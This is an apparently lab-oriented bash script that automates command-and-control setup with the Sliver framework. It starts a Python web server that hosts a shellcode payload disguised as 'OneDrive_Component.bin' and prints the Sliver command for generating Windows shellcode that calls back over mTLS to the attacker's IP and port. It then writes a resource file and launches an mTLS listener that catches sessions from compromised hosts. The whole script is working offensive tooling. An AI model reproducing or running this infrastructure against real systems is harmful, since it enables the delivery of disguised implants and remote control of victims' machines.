#!/bin/bash

# --- SETUP
LHOST="192.168.122.235"     # enter your Kali's IP here
LPORT="8443"                # reverse shell port
WEB_PORT="8080"             # python Web Server port
PAYLOAD_NAME="OneDrive_Component.bin"

# flag parsing
SKIP_GEN=false
for arg in "$@"; do
    if [ "$arg" == "--skip-generation" ]; then
        SKIP_GEN=true
    fi
done

# get script's absolute directory
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
WWW_DIR="$DIR/www"
RC_FILE="$WWW_DIR/sliver_commands.rc"

# create www dir if not exist
mkdir -p "$WWW_DIR"

echo -e "\e[1;34m[*]=========================================\e[0m"
echo -e "\e[1;34m[*] Launching Automated C2 Infrastructure   \e[0m"
echo -e "\e[1;34m[*]=========================================\e[0m"

# 1. START PYTHON WEB SERVER
echo -e "\e[1;33m[*] 1. Starting Python Web Server on port $WEB_PORT...\e[0m"
cd "$WWW_DIR"
python3 -m http.server $WEB_PORT > /dev/null 2>&1 &
PYTHON_PID=$!  # save server PID
echo -e "\e[1;32m[+] Web Server listening on http://$LHOST:$WEB_PORT\e[0m"
cd "$DIR"

# 2. GENERATE PAYLOAD VIA SEPARATE COMMAND (Se non è attivo il flag skip)
if [ "$SKIP_GEN" = false ]; then
    echo -e "\e[1;33m[*] 2. Instructions for manual payload generation:\e[0m"
    echo -e "\e[1;31m[!] Once inside the Sliver console, if you want to regenerate the payload, copy and paste this command:\e[0m"
    echo -e "\e[1;37m    generate --mtls $LHOST:$LPORT --os windows --arch amd64 --format shellcode --save $PAYLOAD_NAME\e[0m"
    #echo -e "\e[1;31m[!] IMPORTANT: Then rename the generated file to '$PAYLOAD_NAME' using the linux terminal inside 'www/' folder.\e[0m"
    echo "--------------------------------------------------------"
else
    echo -e "\e[1;31m[!] --skip-generation flag detected. Skipping instruction notice.\e[0m"
fi

# 3. CREATE SLIVER RC SCRIPT FOR THE FINAL INTERACTIVE CONSOLE
echo -e "\e[1;33m[*] 3. Creating Sliver Resource Script for Listener...\e[0m"
cat << EOF > "$RC_FILE"
mtls -L $LHOST -l $LPORT
EOF
echo -e "\e[1;32m[+] Resource script generated: $RC_FILE\e[0m"

# 4. LAUNCH INTERACTIVE CONSOLE FROM WWW DIRECTORY
echo -e "\e[1;33m[*] 4. Launching Interactive Sliver Console inside www/ ...\e[0m"
echo -e "\e[1;31m[!] Type 'exit' inside the sliver console to shut down the infrastructure.\e[0m"

cd "$WWW_DIR"

sliver-server --rc "$RC_FILE"

# CLEANUP
echo -e "\n\e[1;34m[*] Shutting down the infrastructure...\e[0m"
echo -e "\e[1;33m[*] Terminating Python Web Server (PID: $PYTHON_PID)...\e[0m"
kill $PYTHON_PID 2>/dev/null
rm -f "$RC_FILE"
echo -e "\e[1;32m[+] Operation completed. Goodbye!\e[0m"
